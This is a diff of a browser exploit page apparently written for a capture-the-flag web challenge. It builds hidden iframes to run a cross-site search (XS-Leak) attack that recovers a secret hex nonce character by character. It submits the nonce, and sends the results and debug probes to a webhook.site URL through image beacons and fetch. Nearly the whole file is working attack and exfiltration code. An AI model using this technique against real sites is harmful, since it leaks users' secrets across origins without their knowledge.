@@ -3,92 +3,72 @@
 <div id="f"></div>
 <script>
 const CHALL = 'https://notes.chall.lac.tf';
-const WH = 'https://webhook.site/14ee7d0b-ebc0-482a-ba4b-417a92c3f289'; 
+const WH = 'https://webhook.site/14ee7d0b-ebc0-482a-ba4b-417a92c3f289';
 const HEX = '0123456789abcdef';
 
-// Use multiple exfil methods for reliability
 const imgs = [];
 function exfil(d){
-    // Method 1: Image beacon (keep reference to prevent GC)
     const img = new Image();
     img.src = WH + '?d=' + encodeURIComponent(d);
     imgs.push(img);
-    // Method 2: fetch as backup
     fetch(WH + '?d=' + encodeURIComponent(d), {mode:'no-cors'}).catch(()=>{});
 }
 
-function testOne(prefix) {
-    return new Promise(resolve => {
-        const v = document.createElement('iframe');
-        v.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
-        document.getElementById('f').appendChild(v);
-        let done = false;
-        function fin(r) { if(done) return; done = true; try{v.remove();}catch(e){} resolve(r); }
-        const to = setTimeout(() => fin(false), 12000);
+// DEBUG: Test one iframe with detailed reporting at multiple time intervals
+async function debugTest(query, label) {
+    const v = document.createElement('iframe');
+    v.style.cssText = 'width:10px;height:10px';
+    document.getElementById('f').appendChild(v);
 
-        v.onload = () => {
-            setTimeout(() => {
-                let t = 0;
-                try { t = v.contentWindow.length; } catch(e) { clearTimeout(to); fin(false); return; }
-                if (t === 0) {
-                    setTimeout(() => {
-                        try { t = v.contentWindow.length; } catch(e) {}
-                        if (t === 0) { clearTimeout(to); fin(false); return; }
-                        go(t);
-                    }, 800);
-                } else go(t);
+    const t0 = performance.now();
+    v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(query);
 
-                function go(total) {
-                    for (let i = 0; i < total; i++) {
-                        try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
-                    }
-                    setTimeout(() => {
-                        let blk = 0;
-                        for (let i = 0; i < total; i++) {
-                            try { v.contentWindow.frames[i].document; } catch(e) { blk++; }
-                        }
-                        clearTimeout(to);
-                        fin(blk >= 1);
-                    }, 2000);
-                }
-            }, 300);
-        };
-        v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(prefix);
+    // Wait for onload
+    await new Promise((res) => {
+        v.onload = res;
+        setTimeout(res, 10000);
     });
-}
+    const loadTime = Math.round(performance.now() - t0);
 
-function findChar(nonce) {
-    return new Promise(resolve => {
-        let found = false;
-        let done = 0;
-        HEX.split('').forEach(c => {
-            testOne(nonce + c).then(match => {
-                if (match && !found) { found = true; resolve(c); }
-                done++;
-                if (done === 16 && !found) resolve(null);
-            });
-        });
-    });
+    // Check frames at multiple intervals
+    for (const wait of [100, 500, 1000, 2000]) {
+        await new Promise(r => setTimeout(r, wait === 100 ? 100 : wait - (wait === 500 ? 100 : wait === 1000 ? 500 : 1000)));
+        let len = -1;
+        try { len = v.contentWindow.length; } catch(e) { exfil(label + '_' + wait + 'ms_lenERR'); continue; }
+        exfil(label + '_' + wait + 'ms_len=' + len);
+    }
+
+    // Now navigate all frames to about:blank
+    let total = 0;
+    try { total = v.contentWindow.length; } catch(e) {}
+    let navOK = 0;
+    for (let i = 0; i < total; i++) {
+        try { v.contentWindow.frames[i].location = 'about:blank'; navOK++; } catch(e) {}
+    }
+    exfil(label + '_nav=' + navOK + '/' + total);
+
+    // Check access at multiple intervals after navigation
+    for (const wait of [300, 800, 1500, 3000]) {
+        await new Promise(r => setTimeout(r, wait === 300 ? 300 : wait - (wait === 800 ? 300 : wait === 1500 ? 800 : 1500)));
+        let acc = 0, blk = 0;
+        for (let i = 0; i < total; i++) {
+            try { v.contentWindow.frames[i].document; acc++; } catch(e) { blk++; }
+        }
+        exfil(label + '_post' + wait + '_acc=' + acc + '_blk=' + blk);
+    }
+
+    v.remove();
 }
 
 (async () => {
-    exfil('go');
-    let nonce = '';
-    for (let p = 0; p < 8; p++) {
-        const c = await findChar(nonce);
-        if (c) {
-            nonce += c;
-            exfil('p' + p + '=' + c + '_' + nonce);
-        } else {
-            exfil('m' + p);
-            p--;
-        }
-    }
-    exfil('n=' + nonce);
-    try {
-        const r = await fetch(CHALL + '/guess?nonce=' + nonce);
-        const t = await r.text();
-        exfil('R=' + t);
-    } catch(e) { exfil('E=' + e.message.substring(0,40)); }
+    exfil('DEBUG_START');
+
+    // Test with a query that likely matches (first hex char)
+    await debugTest('a', 'MATCH_a');
+
+    // Test with a query that won't match
+    await debugTest('zzzzzzzz', 'NOMATCH');
+
+    exfil('DEBUG_DONE');
 })();
 </script></body></html>
